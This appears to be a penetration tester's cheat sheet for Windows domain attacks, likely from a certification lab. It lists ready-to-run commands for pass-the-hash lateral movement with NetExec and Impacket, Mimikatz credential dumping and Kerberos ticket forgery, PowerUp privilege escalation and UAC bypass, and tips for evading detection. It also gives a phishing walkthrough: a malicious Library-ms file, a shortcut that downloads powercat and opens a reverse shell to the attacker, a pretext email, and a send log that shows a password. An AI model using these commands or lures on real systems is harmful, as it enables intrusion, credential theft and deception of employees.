# Lateral Movement Cheatsheet

Compiled reference for using NetExec (nxc) Pass-the-Hash techniques and Impacket tooling during lateral movement operations. Replace placeholders (`<target>`, `<user>`, `<domain>`, `<LMHASH:NTHASH>`) with real values before running commands.

---

## NetExec Pass-the-Hash (PTH)

General tips:
- Provide hashes in `LMHASH:NTHASH` format; if LM hash is unknown, use `aad3b435b51404eeaad3b435b51404ee:<NTHASH>`.
- Append `--local-auth` when authenticating against local accounts instead of domain users.
- Add `--continue-on-success` to keep spraying additional targets even after a hit.
- Include `--verbose` for more detail during troubleshooting.

### SMB Module
- List shares with a hash:  
  `nxc smb <target_range> -u <user> -H <LMHASH:NTHASH> --continue-on-success --shares`
- Execute a single command via SMB (default PsExec):  
  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success -x "whoami"`
- Force a specific exec method (PsExec, WMExec, or Atexec):  
  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success --exec-method wmiexec -x "ipconfig /all"`
- Dump SAM remotely with the hash:  
  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success --sam`
- Trigger BloodHound collection with PTH:  
  `nxc smb <target_list.txt> -u <user> -H <LMHASH:NTHASH> --continue-on-success -M bloodhound`

### WinRM Module
- Spawn a remote PowerShell command:  
  `nxc winrm <target> -u <user> -H <LMHASH:NTHASH> --local-auth --continue-on-success -x "hostname"`
- Launch an interactive shell (PowerShell remoting):  
  `nxc winrm <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success --shell`

### RDP Module
- Validate RDP access with a hash (no GUI, just auth check):  
  `nxc rdp <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success`

### WMI Module (via SMB)
- Run a command through WMI while authenticating over SMB with a hash:  
  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success --wmi "powershell.exe -ExecutionPolicy Bypass -Command whoami"`

### RPC/DCOM Module
- Execute commands via DCOM using pass-the-hash:  
  `nxc rpc <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success -M exec -o COMMAND="whoami"`

### MSSQL Module
- Connect to SQL Server with pass-the-hash and enable xp_cmdshell:  
  `nxc mssql <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success -Q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE"`
- Execute OS command through xp_cmdshell:  
  `nxc mssql <target> -u <user> -H <LMHASH:NTHASH> --continue-on-success -Q "EXEC xp_cmdshell 'whoami'"`  
  (requires xp_cmdshell already enabled)

---

## Impacket Lateral Movement Toolkit

All Impacket examples accept `-hashes <LMHASH:NTHASH>` for pass-the-hash; use `-dc-ip <domain_controller_ip>` when Kerberos lookups need help.

### Remote Command & Shell Execution
- PsExec-style service creation (semi-interactive shell):  
  `psexec.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH>`
- SMB exec with named pipes (fileless, command oriented):  
  `smbexec.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH>`
- WMI command execution (semi-interactive prompt):  
  `wmiexec.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH>`
- DCOM-based execution using MMC:  
  `dcomexec.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH>`
- Scheduled task (AT) execution:  
  `atexec.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH> "cmd.exe /c whoami"`
- Remote MSI deployment (drops payload MSI):  
  `msiexec.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH> <msi_path>`
- Interactive SMB client for manual operations:  
  `smbclient.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH>`
- Remote registry modification or query:  
  `reg.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH> query -key HKLM\\Software`

### Service & Task Abuse Helpers
- Query/modify Windows services over RPC:  
  `services.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH> list`
- Manage scheduled tasks:  
  `schtasks.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH> -create`

### SQL Server & LDAP Movement
- MSSQL client with integrated/NTLM auth:  
  `mssqlclient.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH> -windows-auth`
- LDAP queries with a hash (enumerate AD for escalation paths):  
  `ldapdomaindump.py <domain>/<user>@<dc_ip> -hashes <LMHASH:NTHASH>`
- Enumerate domain SIDs and users:  
  `lookupsid.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH>`
- Add new machine account using credentials/hashes:  
  `addcomputer.py <domain>/<user>@<dc_ip> -hashes <LMHASH:NTHASH> -computer-name <NEWCOMPUTER$> -computer-pass <Password>`

### Kerberos & Ticket Operations
- Use pass-the-hash with Kerberos (no password required):  
  `GetUserSPNs.py <domain>/<user> -hashes <LMHASH:NTHASH> -dc-ip <dc_ip>`
  `nxc ldap <dc_ip> -u <user> -p <pass> --continue-on-success --kerberoasting output.txt --kdcHost DC01.oscp.exam`
- Request TGT using NT hash (pass-the-key):  
  `getTGT.py <domain>/<user> -hashes <LMHASH:NTHASH>`
- Relay NTLM across protocols for lateral moves:  
  `ntlmrelayx.py -t smb://<target> -socks -debug`  
  (Feed hashes via coercion tools; combine with `--no-smb-server` for targeted relays.)
- Create forged Kerberos tickets for delegation abuse:  
  `ticketer.py -nthash <NTHASH> -domain <domain> -spn <service>/<target> <user>`
- Perform Resource-Based Constrained Delegation attacks:  
  `rbcd.py <domain>/<user>@<dc_ip> -hashes <LMHASH:NTHASH> -delegate-from <SOURCE$> -delegate-to <TARGET$> -sid <TARGET_SID>`

---

## Mimikatz Command Reference

Run Mimikatz from an elevated context (Administrator) and enable debug privilege before harvesting credentials.

### Setup & Privilege Escalation
- `privilege::debug` – Enable SeDebugPrivilege required for most credential extraction.
- `token::list` – Enumerate available tokens.
- `token::elevate` – Impersonate a higher-privileged token (e.g., SYSTEM).

### LSASS Credentials & Tickets
- `sekurlsa::logonpasswords` – Dump live credentials (usernames, NT hashes, clear-text when available).
- `sekurlsa::logonpasswords /inject` – Spawn an elevated process and dump from there.
- `sekurlsa::kerberos` – List Kerberos tickets from LSASS.
- `sekurlsa::tickets /export` – Export Kerberos tickets (TGT/TGS) to `.kirbi` files.
- `sekurlsa::ekeys` – Retrieve Kerberos encryption keys for sessions.

### SAM, LSA, and DC Sync
- `lsadump::sam` – Dump local SAM database (requires SYSTEM).
- `lsadump::lsa /patch` – Extract cached domain logons and secrets.
- `lsadump::dcsync /domain:<domain> /user:<user_or_krbtgt>` – Perform DCSync to pull password hashes without touching LSASS.
- `lsadump::dcsync /domain:<domain> /all /csv` – Dump entire domain credential set to CSV.

### Credentials Vaults & DPAPI
- `vault::list` – Enumerate Credential Manager entries.
- `vault::cred /patch` – Dump Credential Manager secrets.
- `dpapi::cred /in:<masterkey>` – Decrypt DPAPI-protected credentials when master key is known.
- `dpapi::cache /in:<blob>` – Decode cached domain credentials.

### Kerberos Ticket Forgery & Abuse
- `kerberos::list /export` – Enumerate and export Kerberos tickets.
- `kerberos::ptt <ticket.kirbi>` – Pass-the-ticket by injecting a `.kirbi`.
- `kerberos::golden /user:<user> /domain:<domain> /sid:<domain_sid> /krbtgt:<nt_hash>` – Craft a Golden Ticket.
- `kerberos::silver /service:<service>/<host> /target:<host> /domain:<domain> /sid:<domain_sid> /rc4:<service_hash>` – Craft a Silver Ticket.

### Certificates & Smartcards
- `crypto::certificates /export` – Export installed certificates (search for client auth certs).
- `crypto::capi` – Enumerate CAPI keys and providers.
- `crypto::cng` – List CNG keys.
- `token::elevate /domainadmin` – Leverage smartcard/PKI tokens when present.

### Cleanup
- `sekurlsa::minidump` – Switch LSASS target back to live memory after using minidumps.
- `privilege::debug /restore` – Drop debug privilege when done.
- `exit` – Close Mimikatz cleanly.

---

## PowerUp.ps1 Quick Wins

PowerUp (PowerSploit) remains a fast way to escalate Windows access after landing on a host. Pull it in over HTTP/SMB or drop a local copy, then let it enumerate and weaponize common misconfigurations for you.

- Load the module in-memory or offline:  
  `powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"`  
  `powershell -ep bypass -c ". .\\PowerUp.ps1; Invoke-AllChecks"` (execute from a local copy)
- Core enumeration aliases:  
  `Invoke-AllChecks` (alias of `Invoke-PrivescAudit`) runs every check and prints exploitation hints.  
  `Get-UnquotedService`, `Get-ModifiableServiceFile`, `Get-ModifiableService` spotlight service-based privilege-escalation.  
  `Get-ModifiableScheduledTaskFile`, `Get-ModifiableRegistryAutoRun` surface writable scheduled tasks and autoruns.  
  `Get-RegistryAlwaysInstallElevated`, `Get-RegistryAutoLogon` alert on MSI/UAC misconfigs and stored logons.  
  `Get-UnattendedInstallFile`, `Get-WebConfig`, `Get-ApplicationHost`, `Get-SiteListPassword`, `Get-CachedGPPPassword` hunt for clear-text credentials across the file system.
- Built-in exploitation helpers:  
  `Invoke-ServiceAbuse -ServiceName <svc> -Command "cmd.exe /c <payload>"` swaps binaries and restarts services for quick SYSTEM shells.  
  `Write-ServiceBinary -ServiceName <svc> -Path C:\Temp\payload.exe` and `Restore-ServiceBinary` manage replacements cleanly.  
  `Write-UserAddMSI -Output C:\Temp\backdoor.msi` weaponizes AlwaysInstallElevated with a user-creation MSI.  
  `Invoke-EventVwrBypass -Command "cmd.exe /c <payload>"` delivers a ready-made UAC bypass.  
  `Find-ProcessDLLHijack`, `Find-PathDLLHijack`, and `Write-HijackDll` chain DLL hijacks when writable directories are discovered.

---

## Phishing

* Step 1 setup webdav ( config.Library-ms file )
```bash
kali@kali:~$ mkdir /home/kali/beyond/webdav

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
Running without configuration file.
04:47:04.860 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
04:47:04.861 - INFO    : WsgiDAV/4.0.2 Python/3.10.7 Linux-5.18.0-kali7-amd64-x86_64-with-glibc2.34
04:47:04.861 - INFO    : Lock manager:      LockManager(LockStorageDict)
04:47:04.861 - INFO    : Property manager:  None
04:47:04.861 - INFO    : Domain controller: SimpleDomainController()
04:47:04.861 - INFO    : Registered DAV providers by route:
04:47:04.861 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.10/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
04:47:04.861 - INFO    :   - '/': FilesystemProvider for path '/home/kali/beyond/webdav' (Read-Write) (anonymous)
04:47:04.861 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
04:47:04.861 - WARNING : Share '/' will allow anonymous write access.
04:47:04.861 - WARNING : Share '/:dir_browser' will allow anonymous read access.
04:47:05.149 - INFO    : Running WsgiDAV/4.0.2 Cheroot/8.6.0 Python 3.10.7
04:47:05.149 - INFO    : Serving on http://0.0.0.0:80 ...



<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url> # ip for kali
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>

```

* Step 2  config shortcut file

right-click on the Desktop and select New > Shortcut ( On Windows Machine ) and transfer back to kali

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```
* Step 3 Setup powercat and python3 server

```bash
kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

kali@kali:~/beyond$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```
* Step 4 nc listener

```bash
rlwrap nc -lvnp 4444
```

* Step 5 Create the body content

```bash
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

Alex
```

* Step 6 Send the phsing email
```bash
kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
Username: john
Password: dqsTwTpZPn#nL
=== Trying 192.168.50.242:25...
=== Connected to 192.168.50.242.
<-  220 MAILSRV1 ESMTP
 -> EHLO kali
<-  250-MAILSRV1
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> am9obg==
<-  334 UGFzc3dvcmQ6
 -> ZHFzVHdUcFpQbiNuTA==
<-  235 authenticated.
 -> MAIL FROM:<john@beyond.com>
<-  250 OK
 -> RCPT TO:<marcus@beyond.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 36 lines sent
<-  250 Queued (1.088 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

---

### Quick Reference Notes
- When only an NT hash is available, prepend the empty LM hash (`aad3b435b51404eeaad3b435b51404ee:`) to satisfy tools that expect both halves.
- Combine NetExec with `-o KERBEROAST` or Impacket’s `GetNPUsers.py` to harvest additional hashes before pivoting.
- For noisy environments, throttle NetExec with `--rate` and Impacket with `--port` adjustments to avoid detection.
